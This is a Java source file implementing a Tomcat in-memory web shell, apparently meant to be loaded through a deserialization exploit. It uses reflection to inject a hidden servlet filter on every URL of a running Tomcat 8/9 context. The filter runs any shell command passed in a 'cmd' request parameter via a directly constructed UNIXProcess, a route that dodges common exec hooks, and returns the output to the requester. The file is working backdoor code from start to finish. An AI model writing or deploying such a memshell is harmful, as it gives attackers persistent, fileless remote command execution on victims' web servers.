package xyz.eki.marshalexp.memshell.Tomcat.Filter;

import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import javax.servlet.*;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.Map;

/*
Tomcat 8,9 tested
 */
public class TomcatFilterMemshellUNIXProcess implements Filter {

    private final String cmdParamName = "cmd";
    private final static String filterUrlPattern = "/*";

    static {
        try {
            final String name = String.valueOf(System.nanoTime());

            WebappClassLoaderBase webappClassLoaderBase =
                    (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();

            StandardContext standardContext;

            try {
                standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
            } catch (Exception ignored) {
                Field field = webappClassLoaderBase.getClass().getSuperclass().getDeclaredField("resources");
                field.setAccessible(true);
                Object root   = field.get(webappClassLoaderBase);
                Field  field2 = root.getClass().getDeclaredField("context");
                field2.setAccessible(true);

                standardContext = (StandardContext) field2.get(root);
            }

            Class<? extends StandardContext> aClass = null;
            try {
                aClass = (Class<? extends StandardContext>) standardContext.getClass().getSuperclass();
                aClass.getDeclaredField("filterConfigs");
            } catch (Exception e) {
                aClass = standardContext.getClass();
                aClass.getDeclaredField("filterConfigs");
            }
            Field Configs = aClass.getDeclaredField("filterConfigs");
            Configs.setAccessible(true);
            Map filterConfigs = (Map) Configs.get(standardContext);

            TomcatFilterMemshellUNIXProcess behinderFilter = new TomcatFilterMemshellUNIXProcess();

            FilterDef filterDef = new FilterDef();
            filterDef.setFilter(behinderFilter);
            filterDef.setFilterName(name);
            filterDef.setFilterClass(behinderFilter.getClass().getName());

            standardContext.addFilterDef(filterDef);

            FilterMap filterMap = new FilterMap();
            filterMap.addURLPattern(filterUrlPattern);
            filterMap.setFilterName(name);
            filterMap.setDispatcher(DispatcherType.REQUEST.name());

            standardContext.addFilterMapBefore(filterMap);

            Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
            constructor.setAccessible(true);
            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);

            filterConfigs.put(name, filterConfig);
        } catch (Exception ignored) {
        }
    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        System.out.println(
                "TomcatShellInject doFilter.....................................................................");
        String cmd;

        if ((cmd = servletRequest.getParameter(cmdParamName)) != null) {

            Class<?> UnixProcess = null;
            try {
                UnixProcess = Class.forName("java.lang.UNIXProcess");
            } catch (ClassNotFoundException e) {
                e.printStackTrace();
            }
            Constructor<?> constructor = UnixProcess.getDeclaredConstructors()[0];
            constructor.setAccessible(true);

            byte[] argBlock = String.format("-c\00%s",cmd).getBytes();
            Object o = null;
            try {
                o = constructor.newInstance("/bin/sh".getBytes(),
                        argBlock, argBlock.length,
                        null, 0,
                        null,
                        new int[]{-1, -1, -1},
                        false
                );
            } catch (InstantiationException e) {
                e.printStackTrace();
            } catch (IllegalAccessException e) {
                e.printStackTrace();
            } catch (InvocationTargetException e) {
                e.printStackTrace();
            }
            Method getInputStream = null;
            try {
                getInputStream = o.getClass().getDeclaredMethod("getInputStream");
            } catch (NoSuchMethodException e) {
                e.printStackTrace();
            }
            getInputStream.setAccessible(true);
            InputStream invoke = null;
            try {
                invoke = (InputStream) getInputStream.invoke(o);
            } catch (IllegalAccessException e) {
                e.printStackTrace();
            } catch (InvocationTargetException e) {
                e.printStackTrace();
            }
            String output = inputStreamToString(invoke,"UTF-8");

            servletResponse.getOutputStream().write(output.getBytes());
            servletResponse.getOutputStream().flush();
            servletResponse.getOutputStream().close();
            return;
        }
        filterChain.doFilter(servletRequest, servletResponse);
    }

    @Override
    public void destroy() {
    }

    public static String inputStreamToString(InputStream in, String charset) throws IOException {
        try {
            if (charset == null) {
                charset = "UTF-8";
            }
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            int                   a   = 0;
            byte[]                b   = new byte[1024];

            while ((a = in.read(b)) != -1) {
                out.write(b, 0, a);
            }

            return new String(out.toByteArray());
        } catch (IOException e) {
            throw e;
        } finally {
            if (in != null)
                in.close();
        }
    }

}